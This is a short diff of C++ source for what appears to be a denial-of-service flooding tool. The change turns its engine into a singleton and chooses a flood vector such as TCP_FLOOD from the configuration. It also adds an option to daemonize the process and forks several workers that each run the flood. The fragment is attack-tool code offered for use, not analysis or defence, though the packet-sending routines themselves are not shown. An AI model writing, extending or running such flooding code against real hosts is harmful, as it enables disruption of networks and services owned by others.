@@ -1,10 +1,16 @@
 #include "engine.h"
+#include "utils.h"
 #include "vectors.h"
 
 #include <memory>
 #include <unistd.h>
 
-engine::engine() {
+Engine &Engine::get() {
+  static Engine engine{};
+  return engine;
+}
+
+void Engine::start() {
   std::unique_ptr<IVector> flood{[&]() -> IVector * {
     switch (Config::get().vec) {
     case TCP_FLOOD:
@@ -45,7 +51,10 @@ engine::engine() {
     }
   }()};
 
-  for (int i = 0; i < Config::get().trds; ++i) {
+  if (Config::get().daemonize)
+    utils::daemonize();
+
+  for (unsigned int i = 0; i < Config::get().trds; ++i) {
     if (fork())
       flood->run();
   }
